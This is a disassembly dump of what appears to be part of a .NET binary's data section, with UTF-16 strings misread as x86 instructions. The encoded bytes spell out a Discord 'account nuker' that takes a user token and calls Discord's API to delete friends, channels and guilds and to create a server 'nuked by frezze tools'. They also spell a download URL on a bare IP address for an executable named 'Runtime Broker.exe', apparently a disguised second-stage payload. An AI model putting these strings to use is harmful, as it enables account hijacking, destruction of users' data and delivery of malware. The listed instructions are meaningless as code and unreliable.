  404410:	43                   	inc    %ebx
  404411:	75 72                	jne    0x404485
  404413:	72 65                	jb     0x40447a
  404415:	6e                   	outsb  %ds:(%esi),(%dx)
  404416:	74 00                	je     0x404418
  404418:	67 65 74 5f          	addr16 gs je 0x40447b
  40441c:	43                   	inc    %ebx
  40441d:	6f                   	outsl  %ds:(%esi),(%dx)
  40441e:	6e                   	outsb  %ds:(%esi),(%dx)
  40441f:	74 65                	je     0x404486
  404421:	6e                   	outsb  %ds:(%esi),(%dx)
  404422:	74 00                	je     0x404424
  404424:	73 65                	jae    0x40448b
  404426:	74 5f                	je     0x404487
  404428:	43                   	inc    %ebx
  404429:	6f                   	outsl  %ds:(%esi),(%dx)
  40442a:	6e                   	outsb  %ds:(%esi),(%dx)
  40442b:	74 65                	je     0x404492
  40442d:	6e                   	outsb  %ds:(%esi),(%dx)
  40442e:	74 00                	je     0x404430
  404430:	53                   	push   %ebx
  404431:	74 72                	je     0x4044a5
  404433:	69 6e 67 43 6f 6e 74 	imul   $0x746e6f43,0x67(%esi),%ebp
  40443a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40443c:	74 00                	je     0x40443e
  40443e:	69 43 6f 6e 74 65 6e 	imul   $0x6e65746e,0x6f(%ebx),%eax
  404445:	74 00                	je     0x404447
  404447:	48                   	dec    %eax
  404448:	74 74                	je     0x4044be
  40444a:	70 43                	jo     0x40448f
  40444c:	6f                   	outsl  %ds:(%esi),(%dx)
  40444d:	6e                   	outsb  %ds:(%esi),(%dx)
  40444e:	74 65                	je     0x4044b5
  404450:	6e                   	outsb  %ds:(%esi),(%dx)
  404451:	74 00                	je     0x404453
  404453:	52                   	push   %edx
  404454:	6f                   	outsl  %ds:(%esi),(%dx)
  404455:	6f                   	outsl  %ds:(%esi),(%dx)
  404456:	74 00                	je     0x404458
  404458:	53                   	push   %ebx
  404459:	74 61                	je     0x4044bc
  40445b:	72 74                	jb     0x4044d1
  40445d:	00 4a 73             	add    %cl,0x73(%edx)
  404460:	6f                   	outsl  %ds:(%esi),(%dx)
  404461:	6e                   	outsb  %ds:(%esi),(%dx)
  404462:	43                   	inc    %ebx
  404463:	6f                   	outsl  %ds:(%esi),(%dx)
  404464:	6e                   	outsb  %ds:(%esi),(%dx)
  404465:	76 65                	jbe    0x4044cc
  404467:	72 74                	jb     0x4044dd
  404469:	00 4d 6f             	add    %cl,0x6f(%ebp)
  40446c:	76 65                	jbe    0x4044d3
  40446e:	4e                   	dec    %esi
  40446f:	65 78 74             	gs js  0x4044e6
  404472:	00 53 79             	add    %dl,0x79(%ebx)
  404475:	73 74                	jae    0x4044eb
  404477:	65 6d                	gs insl (%dx),%es:(%edi)
  404479:	2e 54                	cs push %esp
  40447b:	65 78 74             	gs js  0x4044f2
  40447e:	00 48 54             	add    %cl,0x54(%eax)
  404481:	54                   	push   %esp
  404482:	50                   	push   %eax
  404483:	4e                   	dec    %esi
  404484:	65 77 00             	gs ja  0x404487
  404487:	67 65 74 5f          	addr16 gs je 0x4044ea
  40448b:	4d                   	dec    %ebp
  40448c:	79 41                	jns    0x4044cf
  40448e:	72 72                	jb     0x404502
  404490:	61                   	popa
  404491:	79 00                	jns    0x404493
  404493:	73 65                	jae    0x4044fa
  404495:	74 5f                	je     0x4044f6
  404497:	4d                   	dec    %ebp
  404498:	79 41                	jns    0x4044db
  40449a:	72 72                	jb     0x40450e
  40449c:	61                   	popa
  40449d:	79 00                	jns    0x40449f
  40449f:	52                   	push   %edx
  4044a0:	65 63 69 70          	arpl   %ebp,%gs:0x70(%ecx)
  4044a4:	69 65 6e 74 4d 79 41 	imul   $0x41794d74,0x6e(%ebp),%esp
  4044ab:	72 72                	jb     0x40451f
  4044ad:	61                   	popa
  4044ae:	79 00                	jns    0x4044b0
  4044b0:	52                   	push   %edx
  4044b1:	65 61                	gs popa
  4044b3:	64 4b                	fs dec %ebx
  4044b5:	65 79 00             	gs jns 0x4044b8
  4044b8:	00 5f 68             	add    %bl,0x68(%edi)
  4044bb:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4044bf:	00 70 00             	add    %dh,0x0(%eax)
  4044c2:	3a 00                	cmp    (%eax),%al
  4044c4:	2f                   	das
  4044c5:	00 2f                	add    %ch,(%edi)
  4044c7:	00 34 00             	add    %dh,(%eax,%eax,1)
  4044ca:	35 00 2e 00 34       	xor    $0x34002e00,%eax
  4044cf:	00 31                	add    %dh,(%ecx)
  4044d1:	00 2e                	add    %ch,(%esi)
  4044d3:	00 32                	add    %dh,(%edx)
  4044d5:	00 34 00             	add    %dh,(%eax,%eax,1)
  4044d8:	30 00                	xor    %al,(%eax)
  4044da:	2e 00 34 00          	add    %dh,%cs:(%eax,%eax,1)
  4044de:	34 00                	xor    $0x0,%al
  4044e0:	2f                   	das
  4044e1:	00 67 00             	add    %ah,0x0(%edi)
  4044e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e5:	00 6f 00             	add    %ch,0x0(%edi)
  4044e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4044e9:	00 69 00             	add    %ch,0x0(%ecx)
  4044ec:	65 00 2f             	add    %ch,%gs:(%edi)
  4044ef:	00 52 00             	add    %dl,0x0(%edx)
  4044f2:	75 00                	jne    0x4044f4
  4044f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4044f5:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4044f9:	00 6d 00             	add    %ch,0x0(%ebp)
  4044fc:	65 00 25 00 32 00 30 	add    %ah,%gs:0x30003200
  404503:	00 42 00             	add    %al,0x0(%edx)
  404506:	72 00                	jb     0x404508
  404508:	6f                   	outsl  %ds:(%esi),(%dx)
  404509:	00 6b 00             	add    %ch,0x0(%ebx)
  40450c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404510:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  404514:	78 00                	js     0x404516
  404516:	65 00 00             	add    %al,%gs:(%eax)
  404519:	25 52 00 75 00       	and    $0x750052,%eax
  40451e:	6e                   	outsb  %ds:(%esi),(%dx)
  40451f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  404523:	00 6d 00             	add    %ch,0x0(%ebp)
  404526:	65 00 5f 00          	add    %bl,%gs:0x0(%edi)
  40452a:	42                   	inc    %edx
  40452b:	00 72 00             	add    %dh,0x0(%edx)
  40452e:	6f                   	outsl  %ds:(%esi),(%dx)
  40452f:	00 6b 00             	add    %ch,0x0(%ebx)
  404532:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404536:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40453a:	78 00                	js     0x40453c
  40453c:	65 00 00             	add    %al,%gs:(%eax)
  40453f:	3b 61 00             	cmp    0x0(%ecx),%esp
  404542:	63 00                	arpl   %eax,(%eax)
  404544:	63 00                	arpl   %eax,(%eax)
  404546:	6f                   	outsl  %ds:(%esi),(%dx)
  404547:	00 75 00             	add    %dh,0x0(%ebp)
  40454a:	6e                   	outsb  %ds:(%esi),(%dx)
  40454b:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40454f:	00 6e 00             	add    %ch,0x0(%esi)
  404552:	75 00                	jne    0x404554
  404554:	6b 00 65             	imul   $0x65,(%eax),%eax
  404557:	00 72 00             	add    %dh,0x0(%edx)
  40455a:	20 00                	and    %al,(%eax)
  40455c:	62 00                	bound  %eax,(%eax)
  40455e:	79 00                	jns    0x404560
  404560:	20 00                	and    %al,(%eax)
  404562:	66 00 72 00          	data16 add %dh,0x0(%edx)
  404566:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40456a:	7a 00                	jp     0x40456c
  40456c:	65 00 20             	add    %ah,%gs:(%eax)
  40456f:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  404573:	00 6f 00             	add    %ch,0x0(%edi)
  404576:	6c                   	insb   (%dx),%es:(%edi)
  404577:	00 73 00             	add    %dh,0x0(%ebx)
  40457a:	00 37                	add    %dh,(%edi)
  40457c:	5b                   	pop    %ebx
  40457d:	00 21                	add    %ah,(%ecx)
  40457f:	00 5d 00             	add    %bl,0x0(%ebp)
  404582:	20 00                	and    %al,(%eax)
  404584:	50                   	push   %eax
  404585:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  404589:	00 61 00             	add    %ah,0x0(%ecx)
  40458c:	73 00                	jae    0x40458e
  40458e:	65 00 20             	add    %ah,%gs:(%eax)
  404591:	00 65 00             	add    %ah,0x0(%ebp)
  404594:	6e                   	outsb  %ds:(%esi),(%dx)
  404595:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  404599:	00 72 00             	add    %dh,0x0(%edx)
  40459c:	20 00                	and    %al,(%eax)
  40459e:	74 00                	je     0x4045a0
  4045a0:	68 00 65 00 20       	push   $0x20006500
  4045a5:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4045a9:	00 6b 00             	add    %ch,0x0(%ebx)
  4045ac:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4045b0:	20 00                	and    %al,(%eax)
  4045b2:	00 1b                	add    %bl,(%ebx)
  4045b4:	41                   	inc    %ecx
  4045b5:	00 75 00             	add    %dh,0x0(%ebp)
  4045b8:	74 00                	je     0x4045ba
  4045ba:	68 00 6f 00 72       	push   $0x72006f00
  4045bf:	00 69 00             	add    %ch,0x0(%ecx)
  4045c2:	7a 00                	jp     0x4045c4
  4045c4:	61                   	popa
  4045c5:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4045c9:	00 6f 00             	add    %ch,0x0(%edi)
  4045cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4045cd:	00 00                	add    %al,(%eax)
  4045cf:	65 68 00 74 00 74    	gs push $0x74007400
  4045d5:	00 70 00             	add    %dh,0x0(%eax)
  4045d8:	73 00                	jae    0x4045da
  4045da:	3a 00                	cmp    (%eax),%al
  4045dc:	2f                   	das
  4045dd:	00 2f                	add    %ch,(%edi)
  4045df:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4045e3:	00 73 00             	add    %dh,0x0(%ebx)
  4045e6:	63 00                	arpl   %eax,(%eax)
  4045e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045e9:	00 72 00             	add    %dh,0x0(%edx)
  4045ec:	64 00 2e             	add    %ch,%fs:(%esi)
  4045ef:	00 63 00             	add    %ah,0x0(%ebx)
  4045f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f3:	00 6d 00             	add    %ch,0x0(%ebp)
  4045f6:	2f                   	das
  4045f7:	00 61 00             	add    %ah,0x0(%ecx)
  4045fa:	70 00                	jo     0x4045fc
  4045fc:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  404602:	38 00                	cmp    %al,(%eax)
  404604:	2f                   	das
  404605:	00 75 00             	add    %dh,0x0(%ebp)
  404608:	73 00                	jae    0x40460a
  40460a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40460e:	73 00                	jae    0x404610
  404610:	2f                   	das
  404611:	00 40 00             	add    %al,0x0(%eax)
  404614:	6d                   	insl   (%dx),%es:(%edi)
  404615:	00 65 00             	add    %ah,0x0(%ebp)
  404618:	2f                   	das
  404619:	00 72 00             	add    %dh,0x0(%edx)
  40461c:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  404621:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  404625:	00 6f 00             	add    %ch,0x0(%edi)
  404628:	6e                   	outsb  %ds:(%esi),(%dx)
  404629:	00 73 00             	add    %dh,0x0(%ebx)
  40462c:	68 00 69 00 70       	push   $0x70006900
  404631:	00 73 00             	add    %dh,0x0(%ebx)
  404634:	00 1f                	add    %bl,(%edi)
  404636:	44                   	inc    %esp
  404637:	00 65 00             	add    %ah,0x0(%ebp)
  40463a:	6c                   	insb   (%dx),%es:(%edi)
  40463b:	00 65 00             	add    %ah,0x0(%ebp)
  40463e:	74 00                	je     0x404640
  404640:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  404645:	00 46 00             	add    %al,0x0(%esi)
  404648:	72 00                	jb     0x40464a
  40464a:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  404650:	64 00 20             	add    %ah,%fs:(%eax)
  404653:	00 00                	add    %al,(%eax)
  404655:	05 20 00 28 00       	add    $0x280020,%eax
  40465a:	00 03                	add    %al,(%ebx)
  40465c:	29 00                	sub    %eax,(%eax)
  40465e:	00 67 68             	add    %ah,0x68(%edi)
  404661:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  404665:	00 70 00             	add    %dh,0x0(%eax)
  404668:	73 00                	jae    0x40466a
  40466a:	3a 00                	cmp    (%eax),%al
  40466c:	2f                   	das
  40466d:	00 2f                	add    %ch,(%edi)
  40466f:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404673:	00 73 00             	add    %dh,0x0(%ebx)
  404676:	63 00                	arpl   %eax,(%eax)
  404678:	6f                   	outsl  %ds:(%esi),(%dx)
  404679:	00 72 00             	add    %dh,0x0(%edx)
  40467c:	64 00 2e             	add    %ch,%fs:(%esi)
  40467f:	00 63 00             	add    %ah,0x0(%ebx)
  404682:	6f                   	outsl  %ds:(%esi),(%dx)
  404683:	00 6d 00             	add    %ch,0x0(%ebp)
  404686:	2f                   	das
  404687:	00 61 00             	add    %ah,0x0(%ecx)
  40468a:	70 00                	jo     0x40468c
  40468c:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  404692:	38 00                	cmp    %al,(%eax)
  404694:	2f                   	das
  404695:	00 75 00             	add    %dh,0x0(%ebp)
  404698:	73 00                	jae    0x40469a
  40469a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40469e:	73 00                	jae    0x4046a0
  4046a0:	2f                   	das
  4046a1:	00 40 00             	add    %al,0x0(%eax)
  4046a4:	6d                   	insl   (%dx),%es:(%edi)
  4046a5:	00 65 00             	add    %ah,0x0(%ebp)
  4046a8:	2f                   	das
  4046a9:	00 72 00             	add    %dh,0x0(%edx)
  4046ac:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  4046b1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4046b5:	00 6f 00             	add    %ch,0x0(%edi)
  4046b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4046b9:	00 73 00             	add    %dh,0x0(%ebx)
  4046bc:	68 00 69 00 70       	push   $0x70006900
  4046c1:	00 73 00             	add    %dh,0x0(%ebx)
  4046c4:	2f                   	das
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	19 7b 00             	sbb    %edi,0x0(%ebx)
  4046ca:	22 00                	and    (%eax),%al
  4046cc:	74 00                	je     0x4046ce
  4046ce:	79 00                	jns    0x4046d0
  4046d0:	70 00                	jo     0x4046d2
  4046d2:	65 00 22             	add    %ah,%gs:(%edx)
  4046d5:	00 3a                	add    %bh,(%edx)
  4046d7:	00 22                	add    %ah,(%edx)
  4046d9:	00 32                	add    %dh,(%edx)
  4046db:	00 22                	add    %ah,(%edx)
  4046dd:	00 7d 00             	add    %bh,0x0(%ebp)
  4046e0:	00 21                	add    %ah,(%ecx)
  4046e2:	61                   	popa
  4046e3:	00 70 00             	add    %dh,0x0(%eax)
  4046e6:	70 00                	jo     0x4046e8
  4046e8:	6c                   	insb   (%dx),%es:(%edi)
  4046e9:	00 69 00             	add    %ch,0x0(%ecx)
  4046ec:	63 00                	arpl   %eax,(%eax)
  4046ee:	61                   	popa
  4046ef:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4046f3:	00 6f 00             	add    %ch,0x0(%edi)
  4046f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4046f7:	00 2f                	add    %ch,(%edi)
  4046f9:	00 6a 00             	add    %ch,0x0(%edx)
  4046fc:	73 00                	jae    0x4046fe
  4046fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ff:	00 6e 00             	add    %ch,0x0(%esi)
  404702:	00 5b 68             	add    %bl,0x68(%ebx)
  404705:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  404709:	00 70 00             	add    %dh,0x0(%eax)
  40470c:	73 00                	jae    0x40470e
  40470e:	3a 00                	cmp    (%eax),%al
  404710:	2f                   	das
  404711:	00 2f                	add    %ch,(%edi)
  404713:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404717:	00 73 00             	add    %dh,0x0(%ebx)
  40471a:	63 00                	arpl   %eax,(%eax)
  40471c:	6f                   	outsl  %ds:(%esi),(%dx)
  40471d:	00 72 00             	add    %dh,0x0(%edx)
  404720:	64 00 2e             	add    %ch,%fs:(%esi)
  404723:	00 63 00             	add    %ah,0x0(%ebx)
  404726:	6f                   	outsl  %ds:(%esi),(%dx)
  404727:	00 6d 00             	add    %ch,0x0(%ebp)
  40472a:	2f                   	das
  40472b:	00 61 00             	add    %ah,0x0(%ecx)
  40472e:	70 00                	jo     0x404730
  404730:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  404736:	38 00                	cmp    %al,(%eax)
  404738:	2f                   	das
  404739:	00 75 00             	add    %dh,0x0(%ebp)
  40473c:	73 00                	jae    0x40473e
  40473e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404742:	73 00                	jae    0x404744
  404744:	2f                   	das
  404745:	00 40 00             	add    %al,0x0(%eax)
  404748:	6d                   	insl   (%dx),%es:(%edi)
  404749:	00 65 00             	add    %ah,0x0(%ebp)
  40474c:	2f                   	das
  40474d:	00 63 00             	add    %ah,0x0(%ebx)
  404750:	68 00 61 00 6e       	push   $0x6e006100
  404755:	00 6e 00             	add    %ch,0x0(%esi)
  404758:	65 00 6c 00 73       	add    %ch,%gs:0x73(%eax,%eax,1)
  40475d:	00 00                	add    %al,(%eax)
  40475f:	21 44 00 65          	and    %eax,0x65(%eax,%eax,1)
  404763:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  404767:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40476b:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40476f:	00 43 00             	add    %al,0x0(%ebx)
  404772:	68 00 61 00 6e       	push   $0x6e006100
  404777:	00 6e 00             	add    %ch,0x0(%esi)
  40477a:	65 00 6c 00 20       	add    %ch,%gs:0x20(%eax,%eax,1)
  40477f:	00 00                	add    %al,(%eax)
  404781:	49                   	dec    %ecx
  404782:	68 00 74 00 74       	push   $0x74007400
  404787:	00 70 00             	add    %dh,0x0(%eax)
  40478a:	73 00                	jae    0x40478c
  40478c:	3a 00                	cmp    (%eax),%al
  40478e:	2f                   	das
  40478f:	00 2f                	add    %ch,(%edi)
  404791:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404795:	00 73 00             	add    %dh,0x0(%ebx)
  404798:	63 00                	arpl   %eax,(%eax)
  40479a:	6f                   	outsl  %ds:(%esi),(%dx)
  40479b:	00 72 00             	add    %dh,0x0(%edx)
  40479e:	64 00 2e             	add    %ch,%fs:(%esi)
  4047a1:	00 63 00             	add    %ah,0x0(%ebx)
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 6d 00             	add    %ch,0x0(%ebp)
  4047a8:	2f                   	das
  4047a9:	00 61 00             	add    %ah,0x0(%ecx)
  4047ac:	70 00                	jo     0x4047ae
  4047ae:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  4047b4:	38 00                	cmp    %al,(%eax)
  4047b6:	2f                   	das
  4047b7:	00 63 00             	add    %ah,0x0(%ebx)
  4047ba:	68 00 61 00 6e       	push   $0x6e006100
  4047bf:	00 6e 00             	add    %ch,0x0(%esi)
  4047c2:	65 00 6c 00 73       	add    %ch,%gs:0x73(%eax,%eax,1)
  4047c7:	00 2f                	add    %ch,(%edi)
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	57                   	push   %edi
  4047cc:	68 00 74 00 74       	push   $0x74007400
  4047d1:	00 70 00             	add    %dh,0x0(%eax)
  4047d4:	73 00                	jae    0x4047d6
  4047d6:	3a 00                	cmp    (%eax),%al
  4047d8:	2f                   	das
  4047d9:	00 2f                	add    %ch,(%edi)
  4047db:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4047df:	00 73 00             	add    %dh,0x0(%ebx)
  4047e2:	63 00                	arpl   %eax,(%eax)
  4047e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047e5:	00 72 00             	add    %dh,0x0(%edx)
  4047e8:	64 00 2e             	add    %ch,%fs:(%esi)
  4047eb:	00 63 00             	add    %ah,0x0(%ebx)
  4047ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ef:	00 6d 00             	add    %ch,0x0(%ebp)
  4047f2:	2f                   	das
  4047f3:	00 61 00             	add    %ah,0x0(%ecx)
  4047f6:	70 00                	jo     0x4047f8
  4047f8:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  4047fe:	38 00                	cmp    %al,(%eax)
  404800:	2f                   	das
  404801:	00 75 00             	add    %dh,0x0(%ebp)
  404804:	73 00                	jae    0x404806
  404806:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40480a:	73 00                	jae    0x40480c
  40480c:	2f                   	das
  40480d:	00 40 00             	add    %al,0x0(%eax)
  404810:	6d                   	insl   (%dx),%es:(%edi)
  404811:	00 65 00             	add    %ah,0x0(%ebp)
  404814:	2f                   	das
  404815:	00 67 00             	add    %ah,0x0(%edi)
  404818:	75 00                	jne    0x40481a
  40481a:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  404820:	73 00                	jae    0x404822
  404822:	00 1d 44 00 65 00    	add    %bl,0x650044
  404828:	6c                   	insb   (%dx),%es:(%edi)
  404829:	00 65 00             	add    %ah,0x0(%ebp)
  40482c:	74 00                	je     0x40482e
  40482e:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  404833:	00 47 00             	add    %al,0x0(%edi)
  404836:	75 00                	jne    0x404838
  404838:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  40483e:	20 00                	and    %al,(%eax)
  404840:	00 45 68             	add    %al,0x68(%ebp)
  404843:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  404847:	00 70 00             	add    %dh,0x0(%eax)
  40484a:	73 00                	jae    0x40484c
  40484c:	3a 00                	cmp    (%eax),%al
  40484e:	2f                   	das
  40484f:	00 2f                	add    %ch,(%edi)
  404851:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404855:	00 73 00             	add    %dh,0x0(%ebx)
  404858:	63 00                	arpl   %eax,(%eax)
  40485a:	6f                   	outsl  %ds:(%esi),(%dx)
  40485b:	00 72 00             	add    %dh,0x0(%edx)
  40485e:	64 00 2e             	add    %ch,%fs:(%esi)
  404861:	00 63 00             	add    %ah,0x0(%ebx)
  404864:	6f                   	outsl  %ds:(%esi),(%dx)
  404865:	00 6d 00             	add    %ch,0x0(%ebp)
  404868:	2f                   	das
  404869:	00 61 00             	add    %ah,0x0(%ecx)
  40486c:	70 00                	jo     0x40486e
  40486e:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  404874:	38 00                	cmp    %al,(%eax)
  404876:	2f                   	das
  404877:	00 67 00             	add    %ah,0x0(%edi)
  40487a:	75 00                	jne    0x40487c
  40487c:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  404882:	73 00                	jae    0x404884
  404884:	2f                   	das
  404885:	00 00                	add    %al,(%eax)
  404887:	0f 2f 00             	comiss (%eax),%xmm0
  40488a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40488e:	6c                   	insb   (%dx),%es:(%edi)
  40488f:	00 65 00             	add    %ah,0x0(%ebp)
  404892:	74 00                	je     0x404894
  404894:	65 00 00             	add    %al,%gs:(%eax)
  404897:	59                   	pop    %ecx
  404898:	68 00 74 00 74       	push   $0x74007400
  40489d:	00 70 00             	add    %dh,0x0(%eax)
  4048a0:	73 00                	jae    0x4048a2
  4048a2:	3a 00                	cmp    (%eax),%al
  4048a4:	2f                   	das
  4048a5:	00 2f                	add    %ch,(%edi)
  4048a7:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4048ab:	00 73 00             	add    %dh,0x0(%ebx)
  4048ae:	63 00                	arpl   %eax,(%eax)
  4048b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b1:	00 72 00             	add    %dh,0x0(%edx)
  4048b4:	64 00 2e             	add    %ch,%fs:(%esi)
  4048b7:	00 63 00             	add    %ah,0x0(%ebx)
  4048ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4048bb:	00 6d 00             	add    %ch,0x0(%ebp)
  4048be:	2f                   	das
  4048bf:	00 61 00             	add    %ah,0x0(%ecx)
  4048c2:	70 00                	jo     0x4048c4
  4048c4:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  4048ca:	38 00                	cmp    %al,(%eax)
  4048cc:	2f                   	das
  4048cd:	00 75 00             	add    %dh,0x0(%ebp)
  4048d0:	73 00                	jae    0x4048d2
  4048d2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4048d6:	73 00                	jae    0x4048d8
  4048d8:	2f                   	das
  4048d9:	00 40 00             	add    %al,0x0(%eax)
  4048dc:	6d                   	insl   (%dx),%es:(%edi)
  4048dd:	00 65 00             	add    %ah,0x0(%ebp)
  4048e0:	2f                   	das
  4048e1:	00 67 00             	add    %ah,0x0(%edi)
  4048e4:	75 00                	jne    0x4048e6
  4048e6:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  4048ec:	73 00                	jae    0x4048ee
  4048ee:	2f                   	das
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	43                   	inc    %ebx
  4048f2:	68 00 74 00 74       	push   $0x74007400
  4048f7:	00 70 00             	add    %dh,0x0(%eax)
  4048fa:	73 00                	jae    0x4048fc
  4048fc:	3a 00                	cmp    (%eax),%al
  4048fe:	2f                   	das
  4048ff:	00 2f                	add    %ch,(%edi)
  404901:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404905:	00 73 00             	add    %dh,0x0(%ebx)
  404908:	63 00                	arpl   %eax,(%eax)
  40490a:	6f                   	outsl  %ds:(%esi),(%dx)
  40490b:	00 72 00             	add    %dh,0x0(%edx)
  40490e:	64 00 2e             	add    %ch,%fs:(%esi)
  404911:	00 63 00             	add    %ah,0x0(%ebx)
  404914:	6f                   	outsl  %ds:(%esi),(%dx)
  404915:	00 6d 00             	add    %ch,0x0(%ebp)
  404918:	2f                   	das
  404919:	00 61 00             	add    %ah,0x0(%ecx)
  40491c:	70 00                	jo     0x40491e
  40491e:	69 00 2f 00 76 00    	imul   $0x76002f,(%eax),%eax
  404924:	38 00                	cmp    %al,(%eax)
  404926:	2f                   	das
  404927:	00 67 00             	add    %ah,0x0(%edi)
  40492a:	75 00                	jne    0x40492c
  40492c:	69 00 6c 00 64 00    	imul   $0x64006c,(%eax),%eax
  404932:	73 00                	jae    0x404934
  404934:	00 1d 43 00 72 00    	add    %bl,0x720043
  40493a:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40493e:	74 00                	je     0x404940
  404940:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  404945:	00 53 00             	add    %dl,0x0(%ebx)
  404948:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40494c:	76 00                	jbe    0x40494e
  40494e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404952:	00 41 7b             	add    %al,0x7b(%ecx)
  404955:	00 22                	add    %ah,(%edx)
  404957:	00 6e 00             	add    %ch,0x0(%esi)
  40495a:	61                   	popa
  40495b:	00 6d 00             	add    %ch,0x0(%ebp)
  40495e:	65 00 22             	add    %ah,%gs:(%edx)
  404961:	00 3a                	add    %bh,(%edx)
  404963:	00 22                	add    %ah,(%edx)
  404965:	00 6e 00             	add    %ch,0x0(%esi)
  404968:	75 00                	jne    0x40496a
  40496a:	6b 00 65             	imul   $0x65,(%eax),%eax
  40496d:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  404971:	00 62 00             	add    %ah,0x0(%edx)
  404974:	79 00                	jns    0x404976
  404976:	20 00                	and    %al,(%eax)
  404978:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40497c:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  404980:	7a 00                	jp     0x404982
  404982:	65 00 20             	add    %ah,%gs:(%eax)
  404985:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  404989:	00 6f 00             	add    %ch,0x0(%edi)
  40498c:	6c                   	insb   (%dx),%es:(%edi)
  40498d:	00 73 00             	add    %dh,0x0(%ebx)
  404990:	22 00                	and    (%eax),%al
  404992:	7d 00                	jge    0x404994
  404994:	00 0b                	add    %cl,(%ebx)
  404996:	50                   	push   %eax
  404997:	00 41 00             	add    %al,0x0(%ecx)
  40499a:	54                   	push   %esp
  40499b:	00 43 00             	add    %al,0x0(%ebx)
  40499e:	48                   	dec    %eax
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	11 50 00             	adc    %edx,0x0(%eax)
  4049a4:	75 00                	jne    0x4049a6
  4049a6:	74 00                	je     0x4049a8
  4049a8:	41                   	inc    %ecx
  4049a9:	00 73 00             	add    %dh,0x0(%ebx)
  4049ac:	79 00                	jns    0x4049ae
  4049ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4049af:	00 63 00             	add    %ah,0x0(%ebx)
  4049b2:	00 00                	add    %al,(%eax)
  4049b4:	3f                   	aas
  4049b5:	8b 27                	mov    (%edi),%esp
  4049b7:	73 43                	jae    0x4049fc
  4049b9:	f8                   	clc
  4049ba:	8b 48 a2             	mov    -0x5e(%eax),%ecx
